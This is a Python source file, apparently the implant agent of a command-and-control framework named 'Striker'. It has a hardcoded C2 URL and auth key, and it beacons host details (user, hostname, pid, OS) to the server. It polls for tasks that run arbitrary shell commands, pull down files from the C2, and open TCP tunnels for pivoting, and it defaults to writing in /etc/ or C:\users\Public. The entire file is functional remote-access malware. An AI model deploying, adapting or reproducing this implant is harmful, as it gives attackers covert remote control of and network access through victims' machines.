#!/usr/bin/python3

import sys
import os
import subprocess
import shlex
import json
import time
from time import sleep
import threading
import urllib3
import socket

c2URL = "https://striker-api.debian.local"
authKey = "345c8856fc611d5e3074385404550268"
delay = 5
MAX_FAILED_CONNS = 5

class Striker:

  def __init__(self, servers, authKey, delay):
    self.abort = False
    self.servers = servers
    self.authKey = authKey
    self.delay = int(delay)
    self.baseUrl = ""
    self.uid = ""
    self.config = {}
    self.tasks = {}
    self.os = os.name
    self.user = os.getenv("USER")
    self.hostname = "unknown"
    if (os.name in ["posix"]):
      self.os = "linux"
      try:
        self.hostname = open("/etc/hostname").read().strip()
      except:
        pass
    elif (os.name in ["nt"]):
      self.os = "windows"
    self.writeDir = os.getcwd()
    if self.os == "linux":
      self.writeDir = "/etc/"
    elif self.os == "windows":
      self.writeDir = "C:\\users\\Public\\"
    else:
      if self.writeDir[-1] != "/":
        self.writeDir += "/"

  def httpGet(self, url):
    try:
      br = urllib3.PoolManager()
      res = br.request('GET', url)
      return (res.status, res.data.decode('utf-8'))
    except Exception as e:
      print("[-] Error making GET request to %s: %s" %(url, str(e)))
      return (0, str(e))

  def httpPost(self, url, body):
    try:
      br = urllib3.PoolManager()
      res = br.request('POST', url, body=json.dumps(body).encode('utf-8'), headers={'Content-Type': 'application/json'})
      return (res.status, res.data.decode('utf-8'))
    except Exception as e:
      print("[-] Error making POST request to %s: %s" %(url, str(e)))
      return (0, str(e))

  def httpDownload(self, url, filename):
    wfo = open(filename, "wb")
    br = urllib3.PoolManager()
    res = br.request('GET', url, preload_content=False)
    for chunk in res.stream(4096): wfo.write(chunk)
    res.release_conn()
    wfo.close()
    return

  def info(self):
    return {
      "type": 1,
      "user": self.user,
      "pid": os.getpid(),
      "cwd": os.getcwd(),
      "os": self.os,
      "host": self.hostname
    }

  def tunnel(self, task, client, rhost, rport):
    server = socket.socket()
    try:
      server.connect((rhost, rport))
    except:
      client.close()
      return
    client.settimeout(0.005)
    server.settimeout(0.005)
    blockSize = 999999
    while not self.abort and not task["abort"]:
      try:
        data = client.recv(blockSize)
        if (len(data) == 0):
          break
        server.send(data)
      except socket.error as e:
        if not str(e).startswith("timed out"):
          break
      try:
        data = server.recv(blockSize)
        if (len(data) == 0):
          break
        client.send(data)
      except socket.error as e:
        if not str(e).startswith("timed out"):
          break
    client.close()
    server.close()
    return

  def execTask(self, task):
    taskID = task['uid']
    data = {}
    successful = 0
    try:
      data = task['data']
    except KeyError:
      pass
    result = "Not implemented!"
    if (task["taskType"] == "system"):
      cmd = data['cmd']
      if self.os == "windows" and not cmd.startswith("cmd /c "):
        cmd = "cmd /c '" + cmd + "'"
      try:
        proc = subprocess.Popen(shlex.split(cmd), stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        result = (proc.stderr.read() + proc.stdout.read()).decode('utf-8')
        successful = 1
      except Exception as e:
        result = "Error running shell command: " + str(e)
    elif (task["taskType"] == "abort"):
      self.abort = True
      result = "Session aborted!"
      successful = 1
    elif (task["taskType"] == "writedir"):
      self.writeDir = data["dir"]
      if self.os == "windows" and self.writeDir[-1] != "\\":
        self.writeDir += "\\"
      elif self.writeDir[-1] != "/":
        self.writeDir += "/"
      result = "Write directory updated: " + self.writeDir
      successful = 1
    elif (task["taskType"] == "delay"):
      self.delay = int(data["delay"])
      result = "Updated callback delay to %d secs" %(self.delay)
      successful = 1
    elif (task["taskType"] == "cd"):
      try:
        os.chdir(data["dir"])
        result = os.getcwd()
        successful = 1
      except FileNotFoundError as e:
        result = "Error changing working directory: " + str(e)
    elif (task["taskType"] == "upload"):
      try:
        url = self.baseUrl + "/agent/download/" + data["fileID"]
        self.httpDownload(url, data["name"])
        result = "File uploaded: " + data["name"]
        successful = 1
      except Exception as e:
        result = "Error uploading file: " + str(e)
    elif (task["taskType"] == "tunnel"):
      sock = socket.socket()
      sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
      try:
        sock.bind((data["lhost"], int(data["lport"])))
        sock.listen(10)
        sock.settimeout(1)
        while not self.abort and not task["abort"]:
          try:
            client, addr = sock.accept()
            t = threading.Thread(target=self.tunnel, args=(task, client, data["rhost"], int(data["rport"])))
            t.start()
          except socket.error as e:
            if not str(e).startswith("timed out"):
              break
        sock.close()
        result = "Tunnel closed!"
        successful = 1
      except Exception as e:
        result = "Error starting TCP tunnel: " + str(e)
    elif (task["taskType"] == "kill"):
      targetID = data["uid"]
      for tID in self.tasks:
        target = self.tasks[tID]
        if target["uid"] == targetID:
          target["abort"] = True
          successful = 1;
          break
      if successful:
        result = "Abort signal set for task: " + targetID
      else:
        result = "Invalid task: " + targetID
    task["result"] = {"uid":taskID, "result":result, "successful": successful}
    task["finished"] = True
    return

  def connectToBase(self):
    connected = False
    status = 0
    body = "{}"
    data = self.info()
    data["key"] = self.authKey
    freshConn = True
    while not connected:
      for url in self.servers:
        status = 0
        body = ""
        if self.uid:
          status, body = self.httpGet(url + "/agent/ping/" + self.uid)
          freshConn = False
        else:
          status, body = self.httpPost(url + "/agent/init", data)
        if (status != 200):
          sleep(self.delay)
          continue
        self.baseUrl = url
        connected = True
        break
    if not freshConn:
      return True
    self.config = json.loads(body)
    self.uid = self.config["uid"]
    for url in self.config["redirectors"]:
      if not url in self.servers: self.servers.append(url)
    return True

  def start(self):
    self.connectToBase();
    failedConns = 0
    while True:
      if failedConns >= MAX_FAILED_CONNS:
        self.connectToBase()
        failedConns = 0
        continue
      eTime = time.time() + self.delay
      while time.time() < eTime:
        sleep(1)
        taskResults = []
        for taskID in self.tasks:
          if (self.tasks[taskID]["finished"]):
            taskResults.append(self.tasks[taskID]["result"])
        if len(taskResults) > 0:
          status, body = self.httpPost(self.baseUrl + "/agent/tasks/" + self.uid, taskResults)
          if (status != 200):
            continue
          failedConns = 0
          for result in taskResults:
            del self.tasks[result["uid"]]
      if self.abort:
        break
      status, body = self.httpGet(self.baseUrl + "/agent/tasks/" + self.uid)
      if status != 200:
        failedConns += 1
        continue
      newTasks = json.loads(body)
      if len(newTasks) == 0:
        continue
      for task in newTasks:
        task["finished"] = False
        task["abort"] = False
        self.tasks[task["uid"]] = task
        t = threading.Thread(target=self.execTask, args=(task,))
        t.start()
    return

if __name__ == '__main__':
  striker = Striker([c2URL], authKey, delay)
  try:
    striker.start()
  except KeyboardInterrupt:
    sys.exit(0)
